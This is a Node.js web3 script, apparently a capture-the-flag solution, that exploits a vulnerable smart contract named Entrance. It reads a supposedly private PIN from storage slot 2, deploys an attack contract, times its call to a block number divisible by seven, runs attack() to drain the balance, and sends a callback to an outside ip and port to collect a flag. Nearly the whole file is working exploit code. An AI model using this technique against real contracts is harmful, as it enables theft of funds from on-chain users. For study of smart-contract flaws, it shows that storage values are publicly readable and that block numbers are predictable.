const config = require('./config') //Load configuration
Object.assign(global, config) //Into global scope

const Entrance = require('./Entrance') //Import ABI of vulnerable contract
const Entrance_Hack = require('./Entrance_Hack') //Import ABI and bytecode of hack contract


const web3js = require('web3')

web3 = new web3js(web3Provider)

const Entrance_Hack_contract_model = new web3.eth.Contract(Entrance_Hack.abi) //Load hack contract model

const account = web3.eth.accounts.privateKeyToAccount(privateKey) //Get the account from the private key
web3.eth.accounts.wallet.add(account) //Add the account to web3
web3.eth.defaultAccount = account.address //Set the account ad default

const defaultPayload = { //Default payload used to send transactions
  from: account.address, //The sender address (me)
  gas: 3000000, //Gas limit
  gasPrice //Gas price
}

const exploit = async () => {
  //#region Get PIN
  const pinHex = await web3.eth.getStorageAt( //Get value stored
    Entrance_contract_address, //in the vulnerable contract
    0x02 //At storage index 2 (in our case it's the PIN)
  )
  const pin = parseInt(pinHex, 16) //Convert pin to decimal
  console.log('PIN:', pin)
  //#endregion

  //#region Create hack contract
  const Entrance_Hack_contract = await Entrance_Hack_contract_model
    .deploy({ data: '0x'+Entrance_Hack.bytecode.object, arguments: [Entrance_contract_address, pin] })  //Create contract (generate a transaction)
    .send(defaultPayload) //Send the contract creation transaction for mining
    .on('error', function(error){
      throw error
    })
    .on('transactionHash', function(hash){ //When web3 respond with the transaction hash
      console.log('Contract creation transaction:', hash)
    })

  //Contract created on the blockchain
  console.log('Contract created:', Entrance_Hack_contract.options.address)
  //#endregion
  
  //#region Check balance
  //if contract is OK the balance is 10
  const balance = await Entrance_Hack_contract.methods.getBalance().call(defaultPayload) //Get the balance
  console.log('Balance:', balance)

  if (balance != 10) //Check if balance is correct
    throw 'Something went wrong'
  //#endregion
  

  let lastBlock //Used to limit output
    
  check = async () => {
    const number = await web3.eth.getBlockNumber() //Get current block number

    if (lastBlock == number) //Check if it has been yet printed to the console
      return setTimeout(check, poolInterval); //If yes do nothing and reset the timer
    
    lastBlock = number //Used to limit output
    
    console.log('Next block number:', number+1, '% 7', (number+1)%7 == 0 ? '==' : '!=', '0');

    if ((number+1)%7 == 0) { //If the next block number is %7
      console.log('Starting attack')

      //#region Attack the contract
      await Entrance_Hack_contract.methods.attack() //Create the transaction to trigger attack() on the hack contract
        .send(defaultPayload) //Send the transaction for mining
        .on('transactionHash', function(hash){ //When web3 respond with the transaction hash
          console.log('Attact transaction:', hash)
        })

      console.log('Attack completed')
      //#endregion

      //#region Finalize attack
      const balance = await Entrance_Hack_contract.methods.getBalance().call(defaultPayload) //Get the balance
      console.log('Balance:', balance)

      if (balance <= 300) //Check if balance is correct
        throw 'Something went wrong'

      console.log('Sending callback payload')
      await Entrance_Hack_contract.methods.getFlag(ip, port).send(defaultPayload) //Send the payload for the microservice
      console.log('Payload sent')
      //#endregion
    } else
      setTimeout(check, poolInterval);//Reset the timer
  }

  check()
}

exploit()
